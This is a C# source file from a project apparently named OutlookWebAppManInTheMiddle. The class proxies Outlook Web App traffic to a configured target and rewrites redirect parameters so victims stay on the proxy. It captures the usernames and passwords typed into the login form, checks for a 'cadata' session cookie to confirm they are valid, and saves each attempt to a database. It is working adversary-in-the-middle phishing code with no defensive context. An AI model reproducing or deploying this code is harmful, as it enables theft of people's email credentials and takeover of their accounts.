using HttpContextMapper;
using OutlookWebAppManInTheMiddle.Models;
using System.Collections.Specialized;

namespace OutlookWebAppManInTheMiddle
{
    public class OutlookWebAppContextMapper : ContextMapper
    {
        private LoginAttempt _loginAttempt;
        private readonly OutlookWebAppDbContext _dbContext;

        public OutlookWebAppContextMapper(IConfiguration config, OutlookWebAppDbContext dbContext, IHttpClientFactory httpClientFactory, ILoggerFactory loggerFactory)
            : base(httpClientFactory, loggerFactory)
        {
            var target = config.GetValue<string>("TargetUrlWithProtocol");
            if (target is null) throw new ArgumentNullException(nameof(target), "TargetUrlWithProtocol must be provided in configuration");

            _dbContext = dbContext;

            TargetUrlWithProtocol = target;
            // TODO: fix how we are setting the builder
            UriBuilder = new UriBuilder(TargetUrlWithProtocol);

            DisableSetCookieEncoding = true;
        }

        protected override Task SetUriBuilderPathAndQuery(PathString path, NameValueCollection query)
        {
            if (HttpContext.Request.Query.ContainsKey("url"))
            {
                var urlParameter = query["url"];
                query["url"] = ReplaceProxyWithTarget(ref urlParameter);
            }
            return base.SetUriBuilderPathAndQuery(path, query);
        }

        protected override Task FormRequestContent(Dictionary<string, string> formDictionary)
        {
            if (formDictionary.ContainsKey("destination"))
            {
                var destinationValue = formDictionary["destination"];
                destinationValue = ReplaceProxyWithTarget(ref destinationValue);
                formDictionary["destination"] = destinationValue;
            }

            if (formDictionary.ContainsKey("username") && formDictionary.ContainsKey("password"))
            {
                _loginAttempt = new LoginAttempt()
                {
                    Username = formDictionary["username"],
                    Password = formDictionary["password"],
                };
            }

            return Task.CompletedTask;
        }

        public override async Task Invoke(HttpContext context)
        {
            await base.Invoke(context);
            if (_loginAttempt is not null)
            {
                var setCookies = ResponseMessage.Headers.Where(x => x.Key is "Set-Cookie");
                if (setCookies.Any(x => x.Value.Any(x => x.StartsWith("cadata"))))
                {
                    _loginAttempt.Valid = true;
                }
                await _dbContext.LoginAttempts.AddAsync(_loginAttempt);
                await _dbContext.SaveChangesAsync();
            }
        }
    }
}
